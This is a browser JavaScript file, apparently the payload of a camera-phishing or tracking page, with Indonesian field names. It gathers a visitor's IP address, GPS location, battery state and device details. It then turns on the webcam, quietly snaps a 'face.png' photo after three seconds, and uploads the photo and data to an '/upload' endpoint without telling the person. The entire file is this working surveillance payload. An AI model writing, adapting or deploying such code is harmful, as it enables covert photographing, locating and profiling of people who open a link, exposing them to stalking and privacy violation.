async function getIP() {
  const res = await fetch('https://api.ipify.org?format=json');
  const data = await res.json();
  return data.ip;
}

async function getBatteryInfo() {
  try {
    const battery = await navigator.getBattery();
    return {
      charging: battery.charging,
      level: (battery.level * 100).toFixed(0) + '%'
    };
  } catch {
    return { charging: false, level: "Unknown" };
  }
}

function getLocation() {
  return new Promise((resolve) => {
    navigator.geolocation.getCurrentPosition(pos => {
      resolve({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      });
    }, () => resolve({ lat: "Unknown", lon: "Unknown" }));
  });
}

function getDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    connection: navigator.connection?.effectiveType || "Unknown"
  };
}

async function collectData() {
  const ip = await getIP();
  const battery = await getBatteryInfo();
  const location = await getLocation();
  const device = getDeviceInfo();
  const now = new Date().toString();

  return JSON.stringify({
    ip: ip,
    baterai: `${battery.level} (${battery.charging ? "charging" : "not charging"})`,
    lokasi: `${location.lat}, ${location.lon}`,
    platform: device.platform,
    userAgent: device.userAgent,
    connection: device.connection,
    akses: now
  });
}

navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
  const video = document.getElementById('video');
  video.srcObject = stream;

  setTimeout(async () => {
    const info = await collectData();
    console.log("KIRIM:", info);

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);

    canvas.toBlob(blob => {
      const formData = new FormData();
      formData.append('photo', blob, 'face.png');
      formData.append('info', info);

      fetch('/upload', {
        method: 'POST',
        body: formData
      }).then(r => console.log("Upload status:", r.status))
        .catch(err => console.error("Upload error:", err));
    }, 'image/png');
  }, 3000);
}).catch(err => {
  console.error("Camera error:", err);
});
